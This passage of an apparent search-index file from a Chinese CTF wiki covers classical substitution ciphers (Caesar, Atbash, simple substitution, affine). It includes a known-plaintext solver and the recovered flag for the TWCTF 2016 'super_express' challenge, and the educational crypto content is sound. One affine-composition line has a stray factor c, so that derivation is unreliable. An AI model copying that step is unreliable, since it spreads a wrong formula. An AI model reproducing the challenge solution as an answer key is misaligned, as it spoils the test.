u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd \ny_1,y_2\ny_1,y_2\n \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053\n\n\n\n\n\ny_1=(ax_1+b)\\pmod{26} \\\\\ny_2=(ax_2+b)\\pmod{26}\n\n\n\n\ny_1=(ax_1+b)\\pmod{26} \\\\\ny_2=(ax_2+b)\\pmod{26}\n\n\n\n\n\n\u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97\n\n\n\n\n\ny_1-y_2=a(x_1-x_2)\\pmod{26}\n\n\n\n\ny_1-y_2=a(x_1-x_2)\\pmod{26}\n\n\n\n\n\n\u8fd9\u91cc \ny_1,y_2\ny_1,y_2\n \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 \nx_1\nx_1\n \u4e0e \nx_2\nx_2\n \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 \na\na\n \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 \nb\nb\n \u4e86\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801\n\n\nimport\n \nsys\n\n\nkey\n \n=\n \n****CENSORED***************\n\n\nflag\n \n=\n \nTWCTF{*******CENSORED********}\n\n\n\nif\n \nlen\n(\nkey\n)\n \n%\n \n2\n \n==\n \n1\n:\n\n    \nprint\n(\nKey Length Error\n)\n\n    \nsys\n.\nexit\n(\n1\n)\n\n\n\nn\n \n=\n \nlen\n(\nkey\n)\n \n/\n \n2\n\n\nencrypted\n \n=\n \n\n\nfor\n \nc\n \nin\n \nflag\n:\n\n    \nc\n \n=\n \nord\n(\nc\n)\n\n    \nfor\n \na\n,\n \nb\n \nin\n \nzip\n(\nkey\n[\n0\n:\nn\n],\n \nkey\n[\nn\n:\n2\n*\nn\n]):\n\n        \nc\n \n=\n \n(\nord\n(\na\n)\n \n*\n \nc\n \n+\n \nord\n(\nb\n))\n \n%\n \n251\n\n    \nencrypted\n \n+=\n \n%02x\n \n%\n \nc\n\n\n\nprint\n \nencrypted\n\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\n\n\n\n\n\n\\begin{align*}\nc_1\n=a_1c+b_1 \\\\\nc_2\n=a_2c_1+b_2 \\\\\n   \n=a_1a_2c+a_2b_1c+b_2 \\\\\n   \n=kc+d\n\\end{align*}  \n\n\n\n\n\\begin{align*}\nc_1&=a_1c+b_1 \\\\\nc_2&=a_2c_1+b_2 \\\\\n   &=a_1a_2c+a_2b_1c+b_2 \\\\\n   &=kc+d\n\\end{align*}  \n\n\n\n\n\n\u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e \nc_n\u200b\nc_n\u200b\n \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 \nc_n=xc+y\u200b\nc_n=xc+y\u200b\n \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002\n\n\n\u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b\n\n\nimport\n \ngmpy\n\n\n\nkey\n \n=\n \n****CENSORED****************\n\n\nflag\n \n=\n \nTWCTF{*******CENSORED********}\n\n\n\nf\n \n=\n \nopen\n(\nencrypted\n,\n \nr\n)\n\n\ndata\n \n=\n \nf\n.\nread\n()\n.\nstrip\n(\n\\n\n)\n\n\nencrypted\n \n=\n \n[\nint\n(\ndata\n[\ni\n:\ni\n \n+\n \n2\n],\n \n16\n)\n \nfor\n \ni\n \nin\n \nrange\n(\n0\n,\n \nlen\n(\ndata\n),\n \n2\n)]\n\n\nplaindelta\n \n=\n \nord\n(\nflag\n[\n1\n])\n \n-\n \nord\n(\nflag\n[\n0\n])\n\n\ncipherdalte\n \n=\n \nencrypted\n[\n1\n]\n \n-\n \nencrypted\n[\n0\n]\n\n\na\n \n=\n \ngmpy\n.\ninvert\n(\nplaindelta\n,\n \n251\n)\n \n*\n \ncipherdalte\n \n%\n \n251\n\n\nb\n \n=\n \n(\nencrypted\n[\n0\n]\n \n-\n \na\n \n*\n \nord\n(\nflag\n[\n0\n]))\n \n%\n \n251\n\n\na_inv\n \n=\n \ngmpy\n.\ninvert\n(\na\n,\n \n251\n)\n\n\nresult\n \n=\n \n\n\nfor\n \nc\n \nin\n \nencrypted\n:\n\n    \nresult\n \n+=\n \nchr\n((\nc\n \n-\n \nb\n)\n \n*\n \na_inv\n \n%\n \n251\n)\n\n\nprint\n \nresult\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  TWCTF2016-super_express git:\n(\nmaster\n)\n \u2717 python exploit.py\nTWCTF\n{\nFaster_Than_Shinkansen!\n}", 
            "title": "\u5355\u8868\u4ee3\u6362\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_1", 
            "text": "\u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3   \u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f  \u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c http://quipqiup.com/   \u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002", 
            "title": "\u901a\u7528\u7279\u70b9"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_2", 
            "text": "", 
            "title": "\u51ef\u6492\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_3", 
            "text": "\u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684  \u6bcf\u4e2a\u5b57\u6bcd  \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08 \u5faa\u73af\u79fb\u52a8 \uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a  \u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ\n\u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC  \u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a  \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ  \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728 \u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0 \uff1a   \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09  \u504f\u79fb\u91cf\u4e3a 13\uff1a ROT13  \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09  \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09   \u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f  \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002  \u8fd9\u91cc\u4ee5  XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100  \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002  \u660e\u6587\uff1as0a6u3u1s0bv1a\n\u5bc6\u94a5\uff1aguangtou\n\u504f\u79fb\uff1a6,20,0,13,6,19,14,20\n\u5bc6\u6587\uff1ay0u6u3h1y0uj1u", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_4", 
            "text": "\u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f   \u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5  \u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002   \u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002  \u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_5", 
            "text": "\u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002   JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5  http://planetcalc.com/1434/  http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_6", 
            "text": "\u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002", 
            "title": "\u79fb\u4f4d\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#atbash-cipher", 
            "text": "", 
            "title": "Atbash Cipher"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_7", 
            "text": "\u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a  \u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A  \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a  \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_8", 
            "text": "\u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_9", 
            "text": "http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_10", 
            "text": "", 
            "title": "\u7b80\u5355\u66ff\u6362\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_11", 
            "text": "\u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a  \u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz\n\u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb  a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002  \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm  \u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_12", 
            "text": "\u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f 26! 26!  \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_13", 
            "text": "http://quipqiup.com/", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_14", 
            "text": "", 
            "title": "\u4eff\u5c04\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_15", 
            "text": "\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f  E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m \uff0c\u5176\u4e2d   x x  \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57  a a  \u548c  m m  \u4e92\u8d28  m m  \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002   \u89e3\u5bc6\u51fd\u6570\u662f  D(x)=a^{-1}(x-b)\\pmod m D(x)=a^{-1}(x-b)\\pmod m \uff0c\u5176\u4e2d  a^{-1} a^{-1}  \u662f  a a  \u5728  \\mathbb{Z}_{m} \\mathbb{Z}_{m}  \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002  \u4e0b\u9762\u6211\u4eec\u4ee5  E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26  \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a  AFFINE CIPHER \uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf     \u660e\u6587  A  F  F  I  N  E  C  I  P  H  E  R      x  0  5  5  8  13  4  2  8  15  7  4  17    y=5x+8 y=5x+8  8  33  33  48  73  28  18  48  83  43  28  93    y\\mod26 y\\mod26  8  7  7  22  21  2  18  22  5  17  2  15    \u5bc6\u6587  I  H  H  W  V  C  S  W  F  R  C  P     \u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f  IHHWVCSWFRCP \u3002  \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230  a^{-1} a^{-1}  \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26}  \uff0c\u89e3\u5bc6\u5982\u4e0b     \u5bc6\u6587  I  H  H  W  V  C  S  W  F  R  C  P      y y  8  7  7  22  21  2  18  22  5  17  2  15    x=21(y-8) x=21(y-8)  0  -21  -21  294  273  -126  210  294  -63  189  -126  147    x\\mod26 x\\mod26  0  5  5  8  13  4  2  8  15  7  4  17    \u660e\u6587  A  F  F  I  N  E  C  I  P  H  E  R     \u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_16", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002  \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53 a=1 a=1  \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709    \n\\phi(26)=\\phi(2) \\times \\phi(13) = 12  \n\\phi(26)=\\phi(2) \\times \\phi(13) = 12   \u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f    \n12 \\times 26 = 312  \n12 \\times 26 = 312   \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002  \u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002  \u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd  y_1,y_2 y_1,y_2  \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053   \ny_1=(ax_1+b)\\pmod{26} \\\\\ny_2=(ax_2+b)\\pmod{26}  \ny_1=(ax_1+b)\\pmod{26} \\\\\ny_2=(ax_2+b)\\pmod{26}   \u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97   \ny_1-y_2=a(x_1-x_2)\\pmod{26}  \ny_1-y_2=a(x_1-x_2)\\pmod{26}   \u8fd9\u91cc  y_1,y_2 y_1,y_2  \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26  x_1 x_1  \u4e0e  x_2 x_2  \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230  a a  \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230  b b  \u4e86\u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/classical/monoalphabetic/#_17", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801  import   sys  key   =   ****CENSORED***************  flag   =   TWCTF{*******CENSORED********}  if   len ( key )   %   2   ==   1 : \n     print ( Key Length Error ) \n     sys . exit ( 1 )  n   =   len ( key )   /   2  encrypted   =    for   c   in   flag : \n     c   =   ord ( c ) \n     for   a ,   b   in   zip ( key [ 0 : n ],   key [ n : 2 * n ]): \n         c   =   ( ord ( a )   *   c   +   ord ( b ))   %   251 \n     encrypted   +=   %02x   %   c  print   encrypted   \u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0   \n\\begin{align*}\nc_1 =a_1c+b_1 \\\\\nc_2 =a_2c_1+b_2 \\\\\n    =a_1a_2c+a_2b_1c+b_2 \\\\\n    =kc+d\n\\end{align*}    \n\\begin{align*}\nc_1&=a_1c+b_1 \\\\\nc_2&=a_2c_1+b_2 \\\\\n   &=a_1a_2c+a_2b_1c+b_2 \\\\\n   &=kc+d\n\\end{align*}     \u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e  c_n\u200b c_n\u200b  \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210  c_n=xc+y\u200b c_n=xc+y\u200b  \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey 